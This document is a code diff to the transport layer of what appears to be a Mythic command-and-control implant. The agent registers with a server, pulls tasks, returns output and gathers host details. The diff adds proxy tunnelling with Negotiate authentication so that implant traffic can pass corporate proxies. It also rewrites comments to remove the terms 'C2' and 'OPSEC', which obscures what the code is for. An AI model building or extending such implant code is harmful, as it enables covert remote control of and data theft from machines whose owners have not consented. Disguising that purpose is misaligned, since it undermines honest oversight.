@@ -9,6 +9,8 @@ require "system/user"
 require "../command_handler"
 require "../message_handler"
 require "../socks_handler"
+require "./proxy_auth"
+require "./proxy_config"
 
 module Dark::Agent::Transport
   # Base Transport class with common functionality
@@ -61,7 +63,7 @@ module Dark::Agent::Transport
 
     # Sleep for the configured time with jitter, unless sleep_time is 0
     #
-    # Implements variable sleep timing with randomized jitter for OPSEC.
+    # Implements variable sleep timing with randomized jitter for operational security.
     # Skips sleep if sleep_time=0 (polling mode).
     # Uses channel-based interruption for immediate config changes.
     def sleep_with_jitter
@@ -115,7 +117,7 @@ module Dark::Agent::Transport
 
     # MYTHIC CORE METHODS
 
-    # Sends initial check-in information to C2 server
+    # Sends initial check-in information to server
     #
     # Mythic required function: Sends initial agent registration with metadata
     # Returns true if successful with valid callback UUID
@@ -176,7 +178,7 @@ module Dark::Agent::Transport
       return result
     end
 
-    # Retrieves pending tasks from C2 server
+    # Retrieves pending tasks from server
     #
     # Mythic required function: Gets tasks assigned to this agent
     # Returns array of tasks to process
@@ -251,7 +253,7 @@ module Dark::Agent::Transport
       return empty_result
     end
 
-    # Send all queued responses to the C2 server
+    # Send all queued responses to the server
     #
     # Mythic required function: Sends command output back to Mythic server
     def send_responses
@@ -388,10 +390,10 @@ module Dark::Agent::Transport
 
     # SYSTEM INFO GATHERING
 
-    # Build checkin data payload for C2 registration
+    # Build checkin data payload for server registration
     #
     # Collects system details (hostname, username, IPs) and encryption keys
-    # for initial C2 registration and agent identification.
+    # for initial server registration and agent identification.
     protected def gather_system_info
       # Create a simple hash with string values
       checkin_data = {
@@ -552,49 +554,221 @@ module Dark::Agent::Transport
 
     # Helper method to send HTTP request and capture response using a full URL
     protected def send_http_request(full_url : String, headers : ::HTTP::Headers, body : String, method : String = "POST") : {::HTTP::Client::Response?, String?}
-      # Build full URL
       log_debug("#{method} request to #{full_url} | body size: #{body.size}B")
       response = nil
       response_body = nil
+      client : ::HTTP::Client? = nil
+      auth : ProxyAuthenticator? = nil
+      request_headers = headers.dup
 
       begin
-        # Set up HTTP::Client with SSL verification options
         uri = URI.parse(full_url)
+        proxy = ProxyConfig.resolve(uri, @config)
 
-        # Create client based on URL scheme (HTTP or HTTPS)
-        client = if uri.scheme == "https"
-          context = OpenSSL::SSL::Context::Client.new
-          if @config.disable_ssl_verify?
-            context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
+        if proxy
+          log_debug("Routing through proxy #{proxy.host}:#{proxy.port}")
+          auth = Dark::Agent::Transport.build_authenticator(
+            proxy.auth_scheme, proxy.user, proxy.pass, proxy.host, proxy.spn_override
+          )
+          if !proxy.auth_scheme.empty? && auth.nil?
+            raise "Configured proxy authentication is unavailable"
           end
-          ::HTTP::Client.new(uri, tls: context)
+          client = create_proxied_client(uri, proxy, auth)
         else
-          ::HTTP::Client.new(uri)
+          client = create_direct_client(uri)
         end
 
-        # Set increased timeouts for better reliability over high-latency connections
         client.connect_timeout = 20.seconds
         client.read_timeout = 60.seconds
 
-        # Build request path (everything after the domain)
-        request_path = uri.request_target
-
-        # Execute the request - always use POST method with block format
-        client.post(request_path, headers: headers, body: body) do |resp|
-          response = resp
-          io = IO::Memory.new
-          IO.copy(resp.body_io, io)
-          response_body = io.to_s
+        request_path = if proxy && uri.scheme != "https"
+          full_url
+        else
+          uri.request_target
         end
 
-        # Clean up client
-        client.close
+        if proxy && uri.scheme != "https"
+          target_host = uri.host.not_nil!
+          target_port = uri.port || 80
+          unless request_headers.has_key?("Host")
+            request_headers["Host"] = target_port == 80 ? target_host : "#{target_host}:#{target_port}"
+          end
+        else
+          # Proxy credentials belong on the proxy hop, never at the origin.
+          request_headers.delete("Proxy-Authorization")
+        end
+
+        auth_header = proxy && uri.scheme != "https" ? auth.try(&.initial_header) : nil
+        round = 0
+        loop do
+          if proxy && uri.scheme != "https"
+            if value = auth_header
+              request_headers["Proxy-Authorization"] = value
+            else
+              request_headers.delete("Proxy-Authorization")
+            end
+          end
+
+          client.exec(method, request_path, request_headers, body) do |resp|
+            response = resp
+            io = IO::Memory.new
+            IO.copy(resp.body_io, io)
+            response_body = io.to_s
+          end
+
+          break unless proxy && uri.scheme != "https" && response.try(&.status_code) == 407
+          break if round >= PROXY_AUTH_MAX_ROUNDS
+          round += 1
+
+          challenge = response.not_nil!.headers.get?("Proxy-Authenticate").try(&.join(", "))
+          auth ||= authenticator_for_challenge(proxy.not_nil!, challenge)
+          break unless auth
+          auth_header = auth.continue(challenge)
+          break unless auth_header
+        end
+
+        if auth.is_a?(NegotiateProxyAuth) && response && response.status_code != 407
+          final_token = response.not_nil!.headers.get?("Proxy-Authenticate").try(&.join(", "))
+          auth.finish(final_token)
+        end
 
         {response, response_body}
       rescue ex
         log_error("HTTP request error: #{ex.message}")
         {nil, nil}
+      ensure
+        client.try(&.close)
+        auth.try(&.dispose)
       end
+    end
+
+    # PROXY RESOLUTION
+
+    private def create_direct_client(uri : URI) : ::HTTP::Client
+      if uri.scheme == "https"
+        context = OpenSSL::SSL::Context::Client.new
+        if @config.disable_ssl_verify?
+          context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
+        end
+        ::HTTP::Client.new(uri, tls: context)
+      else
+        ::HTTP::Client.new(uri)
+      end
+    end
+
+    private def authenticator_for_challenge(proxy : ProxyInfo, challenge : String?) : ProxyAuthenticator?
+      return nil unless challenge
+      return nil unless proxy.auth_scheme.empty? && proxy.user.empty?
+      return nil unless NegotiateProxyAuth.challenge?(challenge)
+      Dark::Agent::Transport.build_authenticator(
+        "negotiate", proxy.user, proxy.pass, proxy.host, proxy.spn_override
+      )
+    end
+
+    private def create_proxied_client(uri : URI, proxy : ProxyInfo, auth : ProxyAuthenticator?) : ::HTTP::Client
+      target_host = uri.hostname.not_nil!
+      target_port = uri.port || (uri.scheme == "https" ? 443 : 80)
+
+      if uri.scheme == "https"
+        proxy_sock = open_proxy_tunnel(target_host, target_port, proxy, auth)
+
+        tls_context = OpenSSL::SSL::Context::Client.new
+        if @config.disable_ssl_verify?
+          tls_context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
+        end
+        begin
+          tls_sock = OpenSSL::SSL::Socket::Client.new(proxy_sock, context: tls_context,
+            sync_close: true, hostname: target_host)
+        rescue ex
+          proxy_sock.close
+          raise ex
+        end
+
+        ::HTTP::Client.new(tls_sock, target_host, target_port)
+      else
+        ::HTTP::Client.new(proxy.host, proxy.port)
+      end
+    end
+
+    private def open_proxy_tunnel(target_host : String, target_port : Int32,
+                                  proxy : ProxyInfo, auth : ProxyAuthenticator?) : TCPSocket
+      auth_header = auth.try(&.initial_header)
+      created_auth : ProxyAuthenticator? = nil
+      round = 0
+      socket : TCPSocket? = nil
+      keep_socket = false
+      authority = target_host.includes?(':') ? "[#{target_host}]:#{target_port}" : "#{target_host}:#{target_port}"
+      begin
+        loop do
+          socket ||= TCPSocket.new(proxy.host, proxy.port, connect_timeout: 20.seconds)
+          socket.read_timeout = 60.seconds
+          socket.write_timeout = 60.seconds
+          socket.tcp_nodelay = true
+          request = String.build do |str|
+            str << "CONNECT #{authority} HTTP/1.1\r\n"
+            str << "Host: #{authority}\r\n"
+            if value = auth_header
+              str << "Proxy-Authorization: #{value}\r\n"
+            end
+            str << "Proxy-Connection: keep-alive\r\n\r\n"
+          end
+          socket.write(request.to_slice)
+          socket.flush
+
+          # A successful CONNECT has no HTTP body. Parse only its status and headers.
+          response = ::HTTP::Client::Response.from_io(socket, ignore_body: true, decompress: false)
+          status = response.status_code
+          challenge = response.headers.get?("Proxy-Authenticate").try(&.join(", "))
+
+          if response.success?
+            if auth.is_a?(NegotiateProxyAuth)
+              auth.finish(challenge)
+            end
+            keep_socket = true
+            return socket
+          end
+          raise "CONNECT failed with status #{status}" unless status == 407
+          raise "CONNECT proxy authentication exceeded retry limit" if round >= PROXY_AUTH_MAX_ROUNDS
+          round += 1
+          unless auth
+            auth = authenticator_for_challenge(proxy, challenge)
+            created_auth = auth
+          end
+          raise "Proxy requested unsupported authentication" unless auth
+          auth_header = auth.continue(challenge)
+          raise "Proxy authentication did not produce a token" unless auth_header
+          # Drain a framed 407 body before reusing the connection. If the proxy
+          # closes it or gives no framing, start the next request on a fresh socket.
+          if proxy_response_reusable?(socket, response)
+            next
+          end
+          socket.close
+          socket = nil
+        end
+      ensure
+        socket.try(&.close) unless keep_socket
+        created_auth.try(&.dispose)
+      end
+    end
+
+    private def proxy_response_reusable?(socket : TCPSocket, response : ::HTTP::Client::Response) : Bool
+      headers = response.headers
+      return false if headers["Connection"]?.try(&.downcase.includes?("close")) ||
+                      headers["Proxy-Connection"]?.try(&.downcase.includes?("close"))
+      return false if response.version == "HTTP/1.0" &&
+                      !headers["Connection"]?.try(&.downcase.includes?("keep-alive")) &&
+                      !headers["Proxy-Connection"]?.try(&.downcase.includes?("keep-alive"))
+      if encoding = headers["Transfer-Encoding"]?
+        return false unless encoding.downcase == "chunked"
+        ::HTTP::ChunkedContent.new(socket).skip_to_end
+      elsif length = headers["Content-Length"]?
+        count = length.to_i64?
+        raise "Invalid CONNECT response Content-Length" unless count && count >= 0
+        socket.skip(count)
+      else
+        return false
+      end
+      true
     end
 
     # ABSTRACT METHODS FOR SUBCLASSES
